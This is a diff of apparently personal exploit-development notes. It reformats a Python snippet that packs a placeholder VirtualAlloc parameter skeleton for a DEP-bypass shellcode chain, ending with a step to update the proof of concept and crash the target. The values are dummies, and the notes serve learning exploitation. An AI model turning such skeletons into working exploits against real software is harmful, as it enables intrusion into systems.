@@ -1,6 +1,3 @@
----
-aliases:
----
 
 ### INTRO_
 
@@ -99,12 +96,12 @@ So, we send Dummy Skeleton as inputBuffer and change the values after....
 
 
 ```
-va  = pack("<L", (0x45454545)) # dummy VirtualAlloc Address
-va += pack("<L", (0x46464646)) # Shellcode Return Address
-va += pack("<L", (0x47474747)) # # dummy Shellcode Address
-va += pack("<L", (0x48484848)) # dummy dwSize 
-va += pack("<L", (0x49494949)) # # dummy flAllocationType 
-va += pack("<L", (0x51515151)) # dummy flProtect 
+va = pack("<L", 0x45454545) # VirtualAlloc addr 
+va += pack("<L", 0x46464646) # shellcode return addr 
+va += pack("<L", 0x47474747) # lpAddress 
+va += pack("<L", 0x48484848) # dwSize 
+va += pack("<L", 0x49494949) # flAllocationType 
+va += pack("<L", 0x51515151) # flProtect
 ```
 
 Now update the Proof-Of-Concept : and crash it !
